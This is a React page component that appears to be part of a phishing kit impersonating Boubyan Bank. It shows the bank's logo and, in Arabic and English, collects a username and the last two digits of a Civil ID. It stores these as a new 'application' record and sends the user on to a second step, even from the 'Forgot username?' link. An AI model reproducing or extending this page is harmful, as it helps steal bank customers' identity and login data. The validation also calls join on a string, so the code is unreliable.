import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { saveDraftApplication } from '../lib/applicationStorage'

export default function ContinueApplicationPage() {
  const { lang } = useLanguage()
  const isAr = lang === 'ar'
  const navigate = useNavigate()

  const [username, setUsername] = useState('')
  const [civilId, setCivilId] = useState('')
  const [hasError, setHasError] = useState(false)

  const handleNext = () => {
    if (!username.trim() || civilId.join('').length < 2) {
      setHasError(true)
      return
    }

    const payload = {
      id: `app-${Date.now()}`,
      createdAt: new Date().toISOString(),
      status: 'new',
      source: 'continue-application',
      username,
      civilId,
      step: 'step-1',
    }

    saveDraftApplication(payload)
    navigate('/continue-application-step-2')
  }

  return (
    <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-4 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
      <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
        
        {/* Boubyan Logo Section */}
        <div className="mb-6 sm:mb-10 flex justify-center text-center">
          <div className="h-auto w-32 sm:w-40">
            <img
              src={`${import.meta.env.BASE_URL}assets/bob.png`}
              alt="Boubyan Bank Logo"
              className="h-full w-full object-contain"
            />
          </div>
        </div>

        {/* Form Fields Section */}
        <div className="w-full space-y-4 sm:space-y-6">
          <div className="relative">
            <div className={`border-b pb-1.5 sm:pb-2 transition-colors ${hasError ? 'border-[#d32f2f]' : 'border-[#cccccc]'}`}>
              <input
                type="text"
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value)
                  if (hasError) setHasError(false)
                }}
                placeholder={isAr ? 'اسم المستخدم' : 'Username'}
                className="w-full bg-transparent text-right text-base sm:text-lg text-[#333333] outline-none placeholder:text-[#b0b0b0]"
              />
            </div>
            {hasError && (
              <div className="mt-1 text-right text-xs font-medium text-[#d32f2f]">
                {isAr ? 'اسم المستخدم غير صحيح' : 'Invalid username'}
              </div>
            )}
          </div>

          <div className="text-right">
            <button
              type="button"
              onClick={() => navigate('/continue-application-step-2')}
              className="text-xs sm:text-sm font-medium text-[#777777] hover:underline"
            >
              {isAr ? 'نسيت اسم المستخدم؟' : 'Forgot username?'}
            </button>
          </div>

          <div className="pt-1 sm:pt-2">
            <div className="mb-0.5 text-xs text-[#888888]">
              {isAr ? 'البطاقة المدنية' : 'Civil ID'}
            </div>
            <div className="mb-3 text-xs sm:text-sm text-[#777777]">
              {isAr ? 'آخر رقمين من البطاقة المدنية' : 'Last 2 digits of Civil ID'}
            </div>

            {/* Smooth 2-digit direct input fields */}
            <div className="flex justify-end gap-3">
              <input
                type="text"
                maxLength={1}
                value={civilId[0] || ''}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '')
                  setCivilId(val + (civilId[1] || ''))
                  if (hasError) setHasError(false)
                }}
                className="w-10 border-b-2 border-[#b0b0b0] bg-transparent pb-1 text-center text-lg text-[#333333] outline-none focus:border-[#ce1126]"
              />
              <input
                type="text"
                maxLength={1}
                value={civilId[1] || ''}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '')
                  setCivilId((civilId[0] || '') + val)
                  if (hasError) setHasError(false)
                }}
                className="w-10 border-b-2 border-[#b0b0b0] bg-transparent pb-1 text-center text-lg text-[#333333] outline-none focus:border-[#ce1126]"
              />
            </div>
          </div>

          <button
            type="button"
            onClick={handleNext}
            className="mt-6 sm:mt-8 w-full rounded-[22px] bg-[#d32f2f] px-6 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-white shadow-[0_10px_25px_rgba(211,47,47,0.35)] transition hover:brightness-105"
          >
            {isAr ? 'التالي' : 'Next'}
          </button>
        </div>
      </div>
    </section>
  )
}